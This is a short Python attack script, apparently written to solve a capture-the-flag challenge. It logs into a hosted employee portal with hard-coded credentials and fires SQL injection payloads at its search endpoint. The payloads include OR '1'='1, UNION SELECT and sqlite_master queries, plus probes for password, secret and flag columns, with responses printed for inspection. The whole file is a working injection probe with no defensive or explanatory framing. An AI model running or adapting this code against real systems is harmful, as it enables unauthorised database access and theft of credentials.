import urllib.request
import urllib.parse
import http.cookiejar

BASE = "https://chameleo-great-power-zcgb4f64hq-el.a.run.app"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

data = urllib.parse.urlencode({"username": "rango.jayamaha", "password": "password"}).encode()
opener.open(urllib.request.Request(BASE + "/api/login", data=data, method="POST"), timeout=15)

def raw(qs):
    path = "/ceo/employees/search?" + qs
    try:
        resp = opener.open(BASE + path, timeout=15)
        body = resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    s = body.find('<section class="portal-content"')
    e2 = body.find('<script id="_R_"')
    seg = body[s:e2] if s != -1 and e2 != -1 else body[:1500]
    ok = "error-banner" not in seg
    return ok, seg

# The "source" likely maps to a SQL table. Try SQL injection in source or fields.
tests = [
    "source=employees&fields=id,full_name&q=' OR '1'='1",
    "source=employees&fields=id,full_name&q=x' UNION SELECT 1,2--",
    "source=employees UNION SELECT 1--&fields=id&q=",
    # fields injection
    "source=employees&fields=*&q=",
    "source=employees&fields=password&q=",
    "source=employees&fields=id,full_name,password&q=",
    "source=employees&fields=id,secret&q=",
    "source=employees&fields=id,flag&q=",
    # source variations from "archive"
    "source=archive_employees&fields=id,full_name&q=",
    "source=employees_archive&fields=id,full_name&q=",
    "source=employee_reviews&fields=id,full_name&q=",
    "source=performance_reviews&fields=id,full_name&q=",
    "source=reviews&fields=*&q=",
    "source=employee&fields=id,full_name&q=",
    "source=users&fields=id,full_name&q=",
    "source=sqlite_master&fields=name&q=",
    "source=sqlite_master&fields=name,sql&q=",
]

for t in tests:
    ok, seg = raw(t)
    print("=====", t, "->", "OK" if ok else "ERR")
    if ok:
        print(seg[:2500])
    print()
